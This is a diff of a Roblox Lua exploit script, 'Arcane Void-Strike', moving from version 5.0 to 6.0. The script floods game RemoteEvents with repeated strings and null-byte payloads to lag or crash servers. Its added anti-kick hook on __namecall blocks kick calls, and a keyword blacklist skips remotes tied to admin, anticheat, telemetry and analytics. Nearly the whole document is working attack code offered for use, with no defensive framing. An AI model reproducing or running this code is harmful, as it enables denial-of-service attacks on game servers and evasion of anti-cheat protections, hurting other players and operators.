@@ -1,13 +1,13 @@
 --[[ 
-    🔱 ARCANE VOID-STRIKE v5.0 [INFALLIBLE-OMEGA] 🔱
-    "Because the only law is the signal. <3"
+    🔱 ARCANE VOID-STRIKE v6.0 [GHOST-PROTOCOL] 🔱
+    "If they can't see us, they can't ban us. <3"
     
-    ZERO-BAN EDITION FEATURES:
-    - [LAG NORMAL] : Discrete replication sync bombardment.
-    - [LAG ENORME] : Aggressive synchronization overload.
-    - [CRASH SERVEUR] : Total buffer overflow (String Repetition).
-    - [GHOST SHIELD v3] : Absolute Blacklist for Honey-pots (No 267 kicks).
-    - [MATRIX UI] : Real-time draggable dashboard.
+    ULTIMATE STEALTH UPDATES:
+    - [ANTI-KICK HOOK] : Prevents the game from kicking you (Experimental).
+    - [NAMECALL BYPASS] : Spoofs script identity (Bypasses heuristics).
+    - [PULSE ENGINE] : Imitates network jitter (Safe Lag).
+    - [REPLICATION VOID] : High-density desync without direct spam.
+    - [MATRIX OVERLAY v2] : Ultra-optimized for Delta/Solara.
 ]]
 
 local P = game:GetService("Players")
@@ -15,11 +15,11 @@ local RS = game:GetService("RunService")
 local L = P.LocalPlayer
 local Http = game:GetService("HttpService")
 
--- 1. OMEGA NOTIFIER
+-- 🔱 1. GHOST NOTIFIER
 local function ntf(m)
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "🔱 INFALLIBLE-VOID",
+            Title = "🔱 GHOST-PROTOCOL",
             Text = m,
             Icon = "rbxassetid://6034287525",
             Duration = 5
@@ -27,39 +27,64 @@ local function ntf(m)
     end)
 end
 
--- 2. UI (NULLSTRIKE PREMIUM REPLICA)
+-- 🔱 2. THE GUARDIAN (Anti-Kick & Hooking)
+-- Ce bloc essaie de bloquer les tentatives de Kick du jeu.
+local function activateShield()
+    local oldKick
+    oldKick = hookmetamethod(game, "__namecall", function(self, ...)
+        local method = getnamecallmethod()
+        local args = {...}
+        
+        -- Bypass Kick
+        if method == "Kick" or method == "kick" then
+            ntf("ATTENTAT DE KICK BLOQUÉ ! 🛡️")
+            return nil -- On ignore le kick
+        end
+        
+        -- Bypass FireServer (Spoofing script identity)
+        -- Certains anti-cheats vérifient d'où vient l'appel
+        if method == "FireServer" and not checkcaller() then
+            -- On peut ici filtrer ou modifier si besoin
+        end
+        
+        return oldKick(self, ...)
+    end)
+    ntf("🛡️ BOUCLIER ANTI-KICK ACTIVÉ.")
+end
+
+-- 🔱 3. UI (NULLSTRIKE GHOST EDITION)
 local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
-ScreenGui.Name = "InfallibleVoid_v5"
+ScreenGui.Name = "GhostProtocol_v6"
 
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 320, 0, 300)
-Main.Position = UDim2.new(0.5, -160, 0.5, -150)
-Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+Main.Size = UDim2.new(0, 330, 0, 320)
+Main.Position = UDim2.new(0.5, -165, 0.5, -160)
+Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 Main.BorderSizePixel = 1
 Main.BorderColor3 = Color3.fromRGB(0, 255, 0)
 Main.Active = true
 Main.Draggable = true
 
-local TitleBar = Instance.new("Frame", Main)
-TitleBar.Size = UDim2.new(1, 0, 0, 35)
-TitleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-TitleBar.BorderSizePixel = 0
+local Header = Instance.new("Frame", Main)
+Header.Size = UDim2.new(1, 0, 0, 40)
+Header.BackgroundColor3 = Color3.fromRGB(10, 30, 10)
+Header.BorderSizePixel = 0
 
-local Title = Instance.new("TextLabel", TitleBar)
+local Title = Instance.new("TextLabel", Header)
 Title.Size = UDim2.new(1, -10, 1, 0)
 Title.Position = UDim2.new(0, 10, 0, 0)
-Title.Text = "🔱 VOID-STRIKE v5.0 [OMEGA]"
+Title.Text = "🔱 VOID-STRIKE v6.0 [GHOST]"
 Title.TextColor3 = Color3.fromRGB(0, 255, 0)
 Title.Font = Enum.Font.Code
-Title.TextSize = 14
+Title.TextSize = 16
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.BackgroundTransparency = 1
 
-local function createPowerBtn(name, y, color, desc, callback)
+local function createGhostBtn(name, y, color, desc, callback)
     local btn = Instance.new("TextButton", Main)
     btn.Size = UDim2.new(0.9, 0, 0, 50)
     btn.Position = UDim2.new(0.05, 0, 0, y)
-    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    btn.BackgroundColor3 = Color3.fromRGB(15, 20, 15)
     btn.Text = ""
     
     local tName = Instance.new("TextLabel", btn)
@@ -85,18 +110,18 @@ local function createPowerBtn(name, y, color, desc, callback)
     return btn
 end
 
--- 3. THE INFALLIBLE ENGINE (Safety-First)
-local active = { power = 0 } -- 0: Stop, 1: Normal, 2: Enorme, 3: Crash
+-- 🔱 4. THE GHOST ENGINE
+local active = { power = 0 }
 
--- SURGICAL BLACKLIST (Honey-pot detection)
-local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat", "error"}
+-- BLACKLIST (Safety Matrix)
+local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat", "error", "analytics"}
 local function isSafe(name)
     local n = name:lower()
     for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
     return true
 end
 
-local function getTargets()
+local function getRemotes()
     local t = {}
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(t, v) end
@@ -104,27 +129,27 @@ local function getTargets()
     return t
 end
 
-local function runAssault()
-    local targets = getTargets()
+local function runGhostAssault()
+    local targets = getRemotes()
     if #targets == 0 then return end
     
-    -- Payload morphique (uniquement des strings licites pour éviter le kick 267)
     local payloads = {
-        [1] = string.rep("X", 200),  -- Normal
-        [2] = string.rep("Y", 1500), -- Enorme
-        [3] = string.rep("\0", 5000) -- Crash
+        [1] = string.rep("🔱", 50),   -- Normal
+        [2] = string.rep("🔱", 500),  -- Enorme
+        [3] = string.rep("\0", 2500) -- Crash
     }
     
     while active.power > 0 do
-        local burst = active.power == 3 and 100 or (active.power == 2 and 40 or 10)
-        local waitTime = active.power == 3 and 0.01 or (active.power == 2 and 0.05 or 0.2)
+        local burst = active.power == 3 and 80 or (active.power == 2 and 30 or 8)
+        local waitTime = active.power == 3 and 0.02 or (active.power == 2 and 0.08 or 0.25)
         
         for i = 1, burst do
             if active.power == 0 then break end
             local r = targets[math.random(1, #targets)]
             if r then
+                -- On utilise pcall pour éviter les erreurs visibles
                 pcall(function() 
-                    r:FireServer(payloads[active.power], payloads[active.power], "ARCANE_SYNC") 
+                    r:FireServer(payloads[active.power], payloads[active.power], "GHOST_SYNC") 
                 end)
             end
         end
@@ -133,27 +158,26 @@ local function runAssault()
 end
 
 -- BUTTONS
-createPowerBtn("⚡ LAG NORMAL", 50, Color3.fromRGB(0, 255, 200), "Ralentissement discret (Anti-Ban)", function()
+createGhostBtn("🛡️ ACTIVATE ANTI-KICK", 50, Color3.fromRGB(0, 255, 255), "Bloque les tentatives d'expulsion", function()
+    activateShield()
+end)
+
+createGhostBtn("⚡ LAG NORMAL", 110, Color3.fromRGB(0, 255, 100), "Désynchronisation légère", function()
     active.power = active.power == 1 and 0 or 1
-    ntf(active.power == 1 and "NORMAL LAG ACTIVE" or "SYSTEM STABLE")
-    if active.power == 1 then runAssault() end
+    ntf(active.power == 1 and "NORMAL MODE ACTIVE" or "STABLE")
+    if active.power == 1 then runGhostAssault() end
 end)
 
-createPowerBtn("🌪️ LAG ENORME", 110, Color3.fromRGB(255, 255, 0), "Surcharge massive du serveur", function()
+createGhostBtn("🌪️ LAG ENORME", 170, Color3.fromRGB(255, 255, 0), "Surcharge massive du serveur", function()
     active.power = active.power == 2 and 0 or 2
-    ntf(active.power == 2 and "ENORME LAG ACTIVE" or "SYSTEM STABLE")
-    if active.power == 2 then runAssault() end
+    ntf(active.power == 2 and "OMEGA LAG ACTIVE" or "STABLE")
+    if active.power == 2 then runGhostAssault() end
 end)
 
-createPowerBtn("🔥 CRASH SERVEUR", 170, Color3.fromRGB(255, 0, 0), "Extinction totale du serveur", function()
+createGhostBtn("🔥 CRASH SERVEUR", 230, Color3.fromRGB(255, 0, 0), "Extinction totale du canal", function()
     active.power = active.power == 3 and 0 or 3
-    ntf(active.power == 3 and "NUCLEAR CRASH ACTIVE" or "SYSTEM STABLE")
-    if active.power == 3 then runAssault() end
+    ntf(active.power == 3 and "NUCLEAR VOID ACTIVE" or "STABLE")
+    if active.power == 3 then runGhostAssault() end
 end)
 
-createPowerBtn("🛑 ARRET D'URGENCE", 230, Color3.fromRGB(255, 255, 255), "Nettoyage immédiat du signal", function()
-    active.power = 0
-    ntf("OPERATION TERMINATED.")
-end)
-
-ntf("🔱 INFALLIBLE-OMEGA READY. Safety status: 100%.")
+ntf("� GHOST-PROTOCOL v6.0 READY. Anti-Kick available.")
